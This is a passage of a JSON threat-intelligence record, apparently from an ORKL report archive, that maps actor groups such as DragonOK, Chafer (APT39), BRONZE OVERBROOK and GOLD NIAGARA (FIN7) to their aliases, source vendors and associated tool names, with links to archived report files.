                "G0017",
                "G0002",
                "Shallow Taurus"
            ],
            "source_name": "MISPGALAXY:DragonOK",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ebda3c6-1789-4d84-97cf-47fb18a0cb28",
            "created_at": "2022-10-25T15:50:23.78829Z",
            "updated_at": "2025-03-27T02:00:55.547275Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "DragonOK"
            ],
            "source_name": "MITRE:DragonOK",
            "tools": [
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bee22874-f90e-410b-93f3-a2f9b1c2e695",
            "created_at": "2022-10-25T16:07:23.45097Z",
            "updated_at": "2025-03-27T02:02:09.808919Z",
            "deleted_at": null,
            "main_name": "Chafer",
            "aliases": [
                "APT 39",
                "Cobalt Hickman",
                "ITG07",
                "Radio Serpens",
                "Remix Kitten",
                "TA454"
            ],
            "source_name": "ETDA:Chafer",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Antak",
                "CACHEMONEY",
                "EternalBlue",
                "HTTPTunnel",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MechaFlounder",
                "Metasploit",
                "Mimikatz",
                "NBTscan",
                "NSSM",
                "Non-sucking Service Manager",
                "POWBAT",
                "Plink",
                "PuTTY Link",
                "Rana",
                "Remcom",
                "Remexi",
                "RemoteCommandExecution",
                "SafetyKatz",
                "UltraVNC",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "nbtscan",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "60d9c778-488b-459e-a2f6-9e48c607ba45",
            "created_at": "2022-10-25T16:47:55.606462Z",
            "updated_at": "2025-03-27T02:05:17.281676Z",
            "deleted_at": null,
            "main_name": "BRONZE OVERBROOK",
            "aliases": [
                "DragonOK ",
                "Samurai Panda ",
                "Temp.DragonOK ",
                "Danti "
            ],
            "source_name": "Secureworks:BRONZE OVERBROOK",
            "tools": [
                " DDKONG",
                " HelloBridge",
                " IsSpace",
                " NFLog Trojan",
                " PLAINTEE",
                " PlugX",
                " Rambo",
                "Aveo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "340d1673-0678-4e1f-8b75-30da2f65cc80",
            "created_at": "2022-10-25T16:07:23.552036Z",
            "updated_at": "2025-03-27T02:02:09.85925Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Bronze Overbrook",
                "Shallow Taurus"
            ],
            "source_name": "ETDA:DragonOK",
            "tools": [
                "Agent.dhwf",
                "CT",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "HelloBridge",
                "IsSpace",
                "KHRAT",
                "Kaba",
                "Korplug",
                "Mongall",
                "NFlog",
                "NewCT",
                "NfLog RAT",
                "PlugX",
                "Poison Ivy",
                "Rambo",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "SysGet",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TidePool",
                "Xamtrav",
                "brebsd",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536231,
    "ts_updated_at": 1743041766,
    "ts_creation_date": 1653705495,
    "ts_modification_date": 1653705495,
    "files": {
        "pdf": "https://archive.orkl.eu/a07bd90c8cd4f535a9768f07c9ba7ada2c709a4a.pdf",
        "text": "https://archive.orkl.eu/a07bd90c8cd4f535a9768f07c9ba7ada2c709a4a.txt",
        "img": "https://archive.orkl.eu/a07bd90c8cd4f535a9768f07c9ba7ada2c709a4a.jpg"
    }
}